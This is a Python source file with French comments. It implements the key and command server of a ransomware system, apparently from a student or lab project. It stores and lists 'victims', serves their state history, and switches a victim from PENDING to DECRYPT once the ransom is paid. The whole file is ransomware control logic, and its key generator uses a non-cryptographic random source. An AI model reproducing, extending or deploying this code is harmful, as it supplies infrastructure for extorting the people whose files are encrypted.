import socket
import datetime
import utile.network as network
import utile.message as message
import utile.data as data
import random
import string



def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
    """
    Générer une clé de longueur (longueur) contenant uniquement les caractères (caracteres)
    :param longueur: La longueur de la clé à générer
    :param caracteres: Les caractères qui composeront la clé
    :return: La clé générée
    """
    return ''.join(random.choice(caracteres) for _ in range(longueur))

def main():
    # Démarrer le serveur
    socket_server = network.start_net_serv()
    print("Serveur démarré")
    # Initialiser la base de données
    conn = data.connect_db()
    if conn is not None:
        print("Base de données initialisée")
    # Attendre une connexion
    print("En attente de connexion...")
    print(f"Connexion de {network.LOCAL_IP} sur le port {network.PORT_SERV_CLES} acceptée")
    print("En attente de messages...")
    while True:
        client_socket, address = socket_server.accept()
        msg1 = network.receive_message(client_socket)
        if msg1 is None:
            print("Aucun message reçu, connexion fermée.")
            client_socket.close()
            continue  # Skip further processing and wait for the next connection
        print(f"Message reçu: {msg1}")
        print(f"Message de type: {message.get_message_type(msg1)}")
        type_message = message.get_message_type(msg1)
        if type_message == "LIST_REQ":
            victims = data.get_list_victims(conn)
            for i in range(len(victims)):
                victime = victims[i]
                # Envoi de la réponse
                message_response = message.set_message("LIST_VICTIM_RESP", victime)
                print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                network.send_message(client_socket, message_response)
                print("Message envoyé")
                if i == len(victims)-1:
                    message_response = message.set_message("LIST_VICTIM_END")
                    print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                    network.send_message(client_socket, message_response)
                    print("Message envoyé")
        elif type_message == "HIST_REQ":
            # Récupérer l'historique
            victim = network.receive_message(client_socket)
            history = data.get_list_history(conn, victim)

            for i in range(len(history)):
                message_response = message.set_message("HISTORY_RESP", history[i])
                print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                network.send_message(client_socket, message_response)
                print("Message envoyé")
                if i == len(history)-1:
                    message_response = message.set_message("HISTORY_END")
                    print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                    network.send_message(client_socket, message_response)
                    print("Message envoyé")
        elif type_message == "CHGSTATE":
            # récupérer l'état actuel de la victime
            victim_id = network.receive_message(client_socket)
            history = data.get_list_history(conn, victim_id)
            if len(history) > 0:
                state = history[-1][3]
                print(state)
                if state == "PENDING":
                    # Changer l'état de la victime
                    items = ["id_states", "id_victim", "datetime", "state"]
                    contenu = [4, victim_id, datetime.datetime.now().timestamp(), "DECRYPT"]
                    data.insert_data(conn, "states", items, contenu)
                    print(f"Changement d'état pour la victime {victim_id} : PENDING -> DECRYPT")
                    message_response = message.set_message("CHANGE_STATE", ["DECRYPT"])
                    print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                    network.send_message(client_socket, message_response)
                    print("Message envoyé")
                elif state == "DECRYPT":
                    print(f"La victime {victim_id} a payé la rançon et est déja décryptée.")
                    message_response = message.set_message("CHANGE_STATE", ["DECRYPTED"])
                    print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                    network.send_message(client_socket, message_response)
                    print("Message envoyé")

                else:
                    print(f"La victime {victim_id} est déjà dans l'état {state}.")
                    message_response = message.set_message("CHANGE_STATE", [state])
                    print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                    network.send_message(client_socket, message_response)
                    print("Message envoyé")
            else:
                print(f"La victime {victim_id} n'a pas d'historique.")
                message_response = message.set_message("CHANGE_STATE", ["UNKNOWN"])
                print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                network.send_message(client_socket, message_response)
                print("Message envoyé")
        elif type_message == "STOP_SERV":
            print("Arrêt du serveur demandé.")
            print("Arrêt du serveur...")
            socket_server.close()
            print("Serveur arrêté.")
            break
        else:
            print("Aucun message à envoyer.")


if __name__ == '__main__':
    main()
